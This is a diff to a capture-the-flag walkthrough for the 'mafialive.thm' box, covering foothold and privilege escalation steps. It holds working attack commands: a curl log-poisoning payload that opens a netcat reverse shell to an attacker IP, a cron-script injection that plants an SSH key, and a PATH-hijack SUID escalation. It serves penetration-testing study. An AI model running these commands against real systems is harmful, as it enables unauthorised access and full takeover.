@@ -105,6 +105,8 @@ The decoded string is:
 ```
 From here we can see some applied security filters that we need to bypass, so we cannot insert`../..` and `view` parameter must contain `/var/www/html/development_testing`. For accessing PHP source code, we need of PHP filters, while for accessing other text files, no. For getting a shell on the target server, we can poison `access.log` file by injecting a reverse shell on the User Agent header.
 
+## Phase 2: Foothold
+
 We can poison it by:
 ```
 curl mafialive.thm -A "<?php echo system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPATTACKER 1337 >/tmp/f') ?>"
@@ -125,5 +127,29 @@ We are inside as `www-data`. By `cat /etc/crontab`, we notice the following:
 ```
 And this file can be edited by everyone, so we can run cron tasks on behalf of `archangel` user. We can get SSH access by creating a SSH key on the attacker machine by `ssh-keygen` and using the public key in the following command that we will inject in `/opt/helloworld.sh`:
 ```
-echo -e "#\!/bin/bash\nmkdir -p /home/archangel/.ssh\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0pW8bOO8eEBBXc3pxIgXCC8BCBuSA5GCAGE+dy8xUw4Xegkwo/oM/UY5tiQOc5b1CFb1lMsSBCoJNMF86AI31YnFHjbZVLb38FDUJ6kJZkNQmYUp8mhWe2x26E7nCiFCyw7pFx1YR2W6/KO5aeZ4TXwjOgkoE+HLVjXC3FMCiqBqfYGgnyjmAI9w1QKD1E+cNk6WuXFSA8uLRnpdRJlJ/ETHrdW9/wjgef4ZXl58euQ886BoyJi6YFRKoCxrCAVpuZpoXNS4D2ZMyhqCKrBqfjlcwlD6Q6j/VP4cmH/ydKT4hiWvayXE6kmPLGaeGTs8Yl+WgJbeGfmMmzFERiW8+EXpufXvTKlcAFR8Ep/tXHST2Sta6sjQ1qbqIhUPC6K+EbKWYiRfcCELhom7C5J9GlbkTNTz3Prxr5LhDC40ecMrNjLAk4gNM5H8Qz4dTPzEuMK7clMSVm4mHBiMCODPMERXN5vfCHidRE6ViOYL2Wue+cUW5wG62RQlbymkp50U= athena@penthost\" >> /home/archangel/.ssh/authorized_keys" > /opt/helloworld.sh
+echo -e "#\!/bin/bash\nmkdir -p /home/archangel/.ssh\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdNHOjCAtt+ONRXZmlVXT8XTjVCgR2SZJkDaY/pXusbWKJdRDV3qO0JnJABUX8EFqD9GXQArAAi8YEQnj3lc5a9dw26QELb7t6W7SkJ81i/wK4ddPtGt4/dJrifnSFlCLNrFKym7LGwl1Y2IJTr4b1RbPMxhhHhl3w/y5QeKX/DDmAP2HJNVG7jpIZFHMMsa4rrjPO0QNI1DGTeG5tp/68JdU1/eQjutpH3Ku3BZhwpO6WiBgx6SGq2xdjhEDzBjxX5bhTVIumBrAQhvF6dEgQ0DtYKPA+CN16W7Qd9+mElIdXN3xbm5QJMcmKnh//p+bQW43pgcLbgusg2VWeK/x7XILIvKDOTsF2dahQkDy+UAfOv0XV74utp5xn/D140CQEEYfwOHZ/H1oxqWbFSleB2ZZFZPiFjKAg8Q8ffY777v9BJ+YC3e5h0vnOZgMtQbujvTv+aS2vGk0f79j/kg+DlQVyFme1VNYVTGNV4e1mUljH228j+yKcZoPzOSpFOYk= athena@penthost\" >> /home/archangel/.ssh/authorized_keys" > /opt/helloworld.sh
 ```
+Then, wait some seconds and, on the attacker machine, run:
+```
+ssh archangel@mafialive.thm
+```
+
+## Phase 3: Privilege Escalation
+
+By searching for files with SUID enabled, we get a `/home/archangel/secret/backup`. By running strings `backup.exe`, we see a command like:
+```
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+```
+At this point, we can create our own `cp` command by creating a `cp` script in the current directory:
+```
+cat > cp << EOF
+> #!/bin/bash
+> /bin/bash -i
+> EOF
+```
+then run:
+```
+chmod +x cp
+export PATH=/home/archangel/secret:$PATH
+```
+Finally, run `./backup`.
